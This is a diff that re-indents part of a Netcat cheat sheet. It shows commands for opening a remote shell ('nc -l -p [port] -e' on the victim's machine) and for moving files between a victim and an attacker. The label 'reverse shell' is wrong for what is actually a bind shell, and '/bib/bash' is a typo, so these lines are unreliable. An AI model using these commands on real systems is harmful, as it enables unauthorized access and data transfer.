@@ -38,18 +38,22 @@ Netcat functions as a back-end tool that allows for port scanning and port liste
 
 * For reverse shell :
 
-In victim's machine
-> nc -l -p [port] -e /bib/bash
+      In victim's machine
+      
+      > nc -l -p [port] -e /bib/bash
 
-In attacker's machine
-> nc [IP] [port]
+      In attacker's machine
+      
+      > nc [IP] [port]
 
 * Remote file transfering :
 
-In victim's machine
-> nc -l -p [port] > filename
+      In victim's machine
+      
+      > nc -l -p [port] > filename
 
-In attacker's machine
-> cat '/path_to_file/filename' | nc [IP] [port]
+      In attacker's machine
+      
+      > cat '/path_to_file/filename' | nc [IP] [port]
 
 
